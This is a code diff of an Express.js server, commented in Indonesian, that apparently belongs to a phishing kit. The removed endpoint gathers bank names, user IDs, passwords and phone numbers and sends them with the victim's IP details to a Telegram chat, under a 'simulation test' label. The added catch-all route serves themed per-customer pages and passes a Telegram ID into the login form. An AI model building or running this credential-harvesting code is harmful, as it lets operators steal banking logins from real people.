@@ -1,81 +1,43 @@
-app.post("/api/simulation-test", async function(req, res) {
-  const { bank, userId, password, waNumber, telegramId, simulation } = req.body;
-  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
-  // Validasi input
-  if (!bank || !userId || !password || !waNumber || !telegramId) {
-    return res.status(400).json({
-      success: false,
-      message: "Semua field harus diisi (Bank, User ID, Password, Nomor WA, Telegram ID)"
-    });
-  }
+  
+app.get('*', (req, res) => {
+  const viewName = req.path.substring(1);
+  const clientConfigPath = path.join(PAGES_CONFIG_DIR, `${viewName}.json`);
 
-  if (simulation !== true) {
-    return res.status(400).json({
-      success: false,
-      message: "Hanya simulasi test yang diterima"
-    });
-  }
-
-  const sessionId = `TEST-${Date.now()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
-
-  try {
-    // ==================== KIRIM NOTIF KE TELEGRAM ====================
-    const ipText = await getIpInfoText(ip);
-    
-    const message = `
-╔═══════════════════════╗
-║   🧪 SIMULASI TEST    ║
-╚═══════════════════════╝
-
-📌 <b>DATA TEST</b>
-━━━━━━━━━━━━━━━━━━━━━
-🏦 <b>Bank:</b> <code>${bank}</code>
-👤 <b>User ID:</b> <code>${userId}</code>
-🔑 <b>Password:</b> <code>${password}</code>
-📱 <b>Nomor WA:</b> <code>${waNumber}</code>
-🆔 <b>Session:</b> <code>${sessionId}</code>
-⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}
-
-${ipText}
-
-━━━━━━━━━━━━━━━━━━━━━
-⚠️ Status: Simulasi Test Data
-    `;
-
-    // Kirim notif ke USER (bukan owner!) - SESUAI FLOW /password
-    const sendStatus = await sendMessage(message, telegramId);
-
-    if (sendStatus === 200) {
-      log.box('success', {
-        Proses: 'SIMULASI TEST',
-        Route: '/api/simulation-test',
-        Bank: bank,
-        UserId: userId,
-        WaNumber: waNumber,
-        TelegramID: telegramId,
-        SessionId: sessionId,
-        IP: ip,
-      });
-
-      return res.json({
-        success: true,
-        message: "✅ Data test berhasil dikirim ke Telegram!",
-        data: { bank, userId, waNumber, sessionId, simulation: true }
-      });
-    } else {
-      log.error('simulation test error', 'Gagal mengirim pesan ke Telegram');
-      return res.status(502).json({
-        success: false,
-        message: "Pesan terkirim tapi gagal masuk Telegram (Retry limit)"
-      });
+  // Cek apakah file JSON ada
+  fs.readFile(clientConfigPath, 'utf-8', (err, data) => {
+    if (err) {
+      return res.status(404).send('JANGAN KESINI NANTI HILANG');
     }
 
-  } catch (error) {
-    log.error('simulation test error', error.message);
-    return res.status(502).json({
-      success: false,
-      message: "Terjadi error saat mengirim simulasi test ke Telegram"
+    const config = JSON.parse(data);
+
+    log.box('request', {
+      Proses: 'BUKA WEBSITE',
+      Path: req.path,
+      Tema: config.theme || '-',
+      UserID: config.telegramId || '-',
+      Tampilan: config.tampilan || '-',
     });
-  }
+
+    // Render dari pages/ (absolute path, bukan dari views/ admin)
+    const viewPath = path.join(PAGES_DIR, `${viewName}.ejs`);
+    if (fs.existsSync(viewPath)) {
+      res.render(viewPath, {
+        title: config.theme,
+        imageUrl1: config.image1Url || '',
+        imageUrl2: config.image2Url || '',
+        imageUrl3: config.image3Url || '',
+        imageUrl4: config.image4Url || '',
+        imageUrl5: config.image5Url || '',
+        telegramId: config.telegramId || '',  // ✅ PASS TELEGRAM ID KE FORM!
+        titlefour: config.titlefour || '',
+        buttonname: config.buttonname || '',
+        footerdesc: config.footerdesc || '',
+        footerImageUrl: config.footerImageUrl || '',
+      });
+    } else {
+      return res.status(404).send('View not found');
+    }
+  });
 });
